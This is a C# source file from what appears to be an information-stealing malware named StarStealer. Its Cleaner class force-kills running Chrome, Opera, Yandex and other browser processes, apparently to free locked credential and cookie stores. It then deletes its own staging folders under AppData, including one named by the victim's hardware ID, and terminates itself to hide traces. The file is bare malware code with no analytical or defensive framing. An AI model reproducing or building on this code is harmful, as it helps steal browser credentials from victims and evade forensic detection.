using StarStealer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace StarStealer.Utilities
{
    class Cleaner
    {
        public static void Kill()
        {
            try
            {
                List<string> stringList = new List<string>() { "chrome", "opera", "yandex", "browser" };
                foreach (Process process in Process.GetProcesses())
                {
                    foreach (string str in stringList)
                    {
                        if (process.ProcessName.ToLower().Contains(str) && !process.ProcessName.ToLower().Contains("autoupdate"))
                            process.Kill();
                    }
                }
            }
            catch
            {

            }
        }
        public static void Clean(ref User user)
        {
            try
            {
                Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Desktop", true);
                Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{user.Hwid}", true);
                Process.GetCurrentProcess().Kill();
            }
            catch
            {

            }
        }
    }
}
